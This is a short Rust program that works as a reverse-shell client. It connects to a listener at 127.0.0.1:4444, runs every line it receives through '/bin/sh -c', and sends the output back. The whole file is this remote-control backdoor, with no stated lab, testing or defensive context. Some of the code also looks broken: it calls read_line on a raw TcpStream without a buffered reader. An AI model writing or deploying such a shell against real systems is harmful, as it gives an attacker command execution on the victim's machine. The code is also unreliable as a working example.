use std::io::{self, BufRead, Write};
use std::net::{TcpStream, TcpListener};
use std::process::Command;

fn main() -> io::Result<()> {
    // Connect to the server
    let mut stream = TcpStream::connect("127.0.0.1:4444")?;
    println!("Connected to the server.");

    // Create a buffer to read commands from the server
    let mut buffer = String::new();

    loop {
        // Read command from the server
        buffer.clear();
        let bytes_read = stream.read_line(&mut buffer)?;
        if bytes_read == 0 {
            println!("Server closed the connection.");
            break;
        }

        // Trim the command and execute it
        let command = buffer.trim();
        println!("Executing command: {}", command);

        // Execute the command
        let output = Command::new("/bin/sh")
            .arg("-c")
            .arg(command)
            .output()
            .expect("Failed to execute command");

        // Send the output back to the server
        let result = String::from_utf8_lossy(&output.stdout);
        stream.write_all(result.as_bytes())?;
        stream.write_all(b"\n")?; // Send a newline after the result
    }

    Ok(())
}

